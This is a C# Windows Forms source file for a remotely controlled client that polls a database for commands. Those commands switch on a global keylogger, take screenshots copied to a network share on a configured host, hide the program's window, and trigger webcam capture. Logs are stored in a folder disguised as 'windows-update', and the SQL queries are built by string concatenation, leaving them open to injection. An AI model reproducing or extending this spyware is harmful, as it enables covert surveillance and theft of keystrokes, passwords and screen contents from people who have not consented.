using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Drawing.Imaging;
using System.Windows;
using MessageBox = System.Windows.MessageBox;
using System.IO;
using Gma.System.MouseKeyHook;
using Microsoft.Win32;
using AForge.Video;
using AForge.Video.DirectShow;


namespace Desktop_COntroller
{
    public partial class main : Form
    {
        public main()
        {
            InitializeComponent();
        }
        private IKeyboardMouseEvents m_GlobalHook;
        bool isEnablefetcher = false;
        Form1 form1 = new Form1();
        FilterInfoCollection filterInfoCollection;
        VideoCaptureDevice videoCapture;


        public void Subscribe()
        {
            isEnablefetcher = true;
            // Note: for the application hook, use the Hook.AppEvents() instead
            m_GlobalHook = Hook.GlobalEvents();

            m_GlobalHook.MouseDownExt += GlobalHookMouseDownExt;
            m_GlobalHook.KeyPress += GlobalHookKeyPress;
        }

        private void GlobalHookKeyPress(object sender, KeyPressEventArgs e)
        {
            //Console.WriteLine("KeyPress: \t{0}", e.KeyChar);
            keyStroke.Text += e.KeyChar;
        }

        private void GlobalHookMouseDownExt(object sender, MouseEventExtArgs e)
        {
            //Console.WriteLine("MouseDown: \t{0}; \t System Timestamp: \t{1}", e.Button, e.Timestamp);
            //keyStroke.Text += e.Button+" ";
            // uncommenting the following line will suppress the middle mouse button click
            // if (e.Buttons == MouseButtons.Middle) { e.Handled = true; }
        }

        public void Unsubscribe()
        {
            isEnablefetcher = false;
            m_GlobalHook.MouseDownExt -= GlobalHookMouseDownExt;
            m_GlobalHook.KeyPress -= GlobalHookKeyPress;

            //It is recommened to dispose it
            m_GlobalHook.Dispose();
        }
        private void timer1_Tick(object sender, EventArgs e)
        {
            pinger();
        }

        private void main_Load(object sender, EventArgs e)
        {
            filterInfoCollection = new FilterInfoCollection(FilterCategory.VideoInputDevice);

            foreach(FilterInfo filterinfo in filterInfoCollection)
            {
                comboBox1.Items.Add(filterinfo.Name);
                comboBox1.SelectedIndex = 0;
                videoCapture = new VideoCaptureDevice();
            }
        }
        private void pinger() {
            
            dbQuery query = new dbQuery();
            AppLogger("Send Ping to Host");
             DataTable res = query.DbSearch("Select * from IPAddress where address='" + form1.GetLocalIPAddress()+ "'");
            AppLogger("Host Responded");
            if (res.Rows.Count == 0)
            {
                AppLogger("Inserting IP Address");
                var ress = query.insert_update_dete("Insert into IPAddress(`address`,`lastPing`,`machineName`) values('" + form1.GetLocalIPAddress() + "',now(),'" + System.Environment.MachineName + "')");
                AppLogger("Inserted");
            }
            else
            {
                AppLogger("Updating Last Ping to the database");
                query.insert_update_dete("update IPAddress set `lastPing`=NOW() where address='" + form1.GetLocalIPAddress() + "'");
                AppLogger("Updated");
            }

            string shutdown = "";
            string ss = "";
            string cloacker = "";
            string keyfetcher = "";
            foreach (DataRow row in res.Rows)
            {
                shutdown = row["shutdown"].ToString();
                ss = row["screenshot"].ToString();
                cloacker = row["hide"].ToString();
                keyfetcher = row["keyLogger"].ToString(); 

            }

            //shutdown
            if (shutdown == "True") {

            }
            
            //screenshot
            if (ss == "True")
            {
                CaptureMyScreen(form1.GetLocalIPAddress());
            }

            //hide/show form
             if (cloacker == "True")
            {
                Hide();
            }
            else if (cloacker == "False")
            {
                Show();

            }

             //key fetcher on/off
            if (keyfetcher == "True") {
                if (isEnablefetcher == false) {
                    Subscribe();
                    saver.Enabled = true;
                    AppLogger("Key Stroke fetch running");

                }

            }
            else
            {
                if (isEnablefetcher == true)
                {
                    Unsubscribe();
                    saver.Enabled = false;
                    keySaver();
                    AppLogger("Key Stroke fetch Disabled");

                }
            }
            AppLogger("keyfetcher: " + keyfetcher);
        }

        private void keySaver()
        {
            string root = System.Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\windows-update\\Logs";

            if (!Directory.Exists(root))
            {
                Directory.CreateDirectory(root);
            }
            string saveLocation = "" + root + "\\" + form1.GetLocalIPAddress() + " - Logs -" + DateTime.Now.ToString("HH-mm-ss tt")+".text";
            System.IO.File.WriteAllText(saveLocation, keyStroke.Text.Replace("\n", Environment.NewLine));
            keyStroke.Text = "";
            AppLogger("Key Save Success");
        }
        private void CaptureMyScreen(String IP)
        {
            try
            {
                double height = SystemParameters.FullPrimaryScreenHeight;
                double width = SystemParameters.FullPrimaryScreenWidth;
                //Creating a new Bitmap object
                Bitmap captureBitmap = new Bitmap(Convert.ToInt32(width), Convert.ToInt32(height), PixelFormat.Format32bppArgb);
                //Bitmap captureBitmap = new Bitmap(int width, int height, PixelFormat);
                //Creating a Rectangle object which will
                //capture our Current Screen
                Rectangle captureRectangle = Screen.AllScreens[0].Bounds;
                //Creating a New Graphics Object
                Graphics captureGraphics = Graphics.FromImage(captureBitmap);
                //Copying Image from The Screen
                captureGraphics.CopyFromScreen(captureRectangle.Left, captureRectangle.Top, 0, 0, captureRectangle.Size);
                //Saving the Image File (I am here Saving it in My E drive).
                string root = System.Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)+"\\windows-update";

                if (!Directory.Exists(root)) {
                    Directory.CreateDirectory(root);
                }
                string saveLocation = "" + root + "\\" + IP + " -" + DateTime.Now.ToString("HH-mm-ss tt") + ".jpg";
                captureBitmap.Save(@saveLocation, ImageFormat.Jpeg);
                AppLogger("Screen Captured");
                //Displaying the Successfull Result
                try
                {
                    string sharedLocation = "\\\\"+Properties.Settings.Default.host+"\\share\\screenCapture\\"+IP;
                        if (!Directory.Exists(sharedLocation))
                    {
                        Directory.CreateDirectory(sharedLocation);
                    }
                    File.Copy(@saveLocation, @sharedLocation+"\\" + IP + " -" + DateTime.Now.ToString("HH-mm-ss tt") + ".jpg", true);
                    AppLogger("Successfull Transfer");
                    if (File.Exists(@saveLocation))
                    {
                        File.Delete(@saveLocation);
                        AppLogger("Screen Captured Deleted");

                    }
                }
                catch(Exception ex)
                {
                    AppLogger(ex.Message);
                }
                

            }
            catch (Exception ex)
            {
                //MessageBox.Show(ex.Message);
                AppLogger(ex.Message);
            }
        }
        public void AppLogger(String txt) {
            richTextBox1.SelectionColor = Color.Green;
            richTextBox1.Text += "\n"+ DateTime.Now.ToString("HH:mm:ss tt")+": " +txt;
            
        }

        private void richTextBox1_TextChanged(object sender, EventArgs e)
        {
            // set the current caret position to the end
            richTextBox1.SelectionStart = richTextBox1.Text.Length;
            // scroll it automatically
            richTextBox1.ScrollToCaret();
        }

        private void label2_Click(object sender, EventArgs e)
        {
            richTextBox1.Text = "";
        }

        private void button1_Click(object sender, EventArgs e)
        {
            pinger();
        }

        private void saver_Tick(object sender, EventArgs e)
        {
            keySaver();
        }

        private void button1_Click_1(object sender, EventArgs e)
        {
            Settings settings = new Settings();
            settings.Show();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            videoCapture = new VideoCaptureDevice(filterInfoCollection[comboBox1.SelectedIndex].MonikerString);

            videoCapture.NewFrame += VideoCaptureDevice_NewFrame;
            videoCapture.Start();

            
        }

        private void VideoCaptureDevice_NewFrame(object sender, NewFrameEventArgs eventArgs)
        {
            pictureBox2.Image = (Bitmap)eventArgs.Frame.Clone();


        }

        private static bool IsWebCamInUse()
        {
            using (var key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam\NonPackaged"))
            {
                foreach (var subKeyName in key.GetSubKeyNames())
                {
                    using (var subKey = key.OpenSubKey(subKeyName))
                    {
                        if (subKey.GetValueNames().Contains("LastUsedTimeStop"))
                        {
                            var endTime = subKey.GetValue("LastUsedTimeStop") is long ? (long)subKey.GetValue("LastUsedTimeStop") : -1;
                            if (endTime <= 0)
                            {
                                return true;
                            }
                        }
                    }
                }
            }

            return false;
        }

        private void button3_Click(object sender, EventArgs e)
        {
            if (pictureBox2.Image != null)
            {
                //Save First
                Bitmap varBmp = new Bitmap(pictureBox2.Image);
                Bitmap newBitmap = new Bitmap(varBmp);
                varBmp.Save(@"E:\a.png", ImageFormat.Png);
                //Now Dispose to free the memory
                varBmp.Dispose();
                varBmp = null;
            }
            else
            {
                AppLogger("Webcam is Unavailable");
            }
        }
    }
}
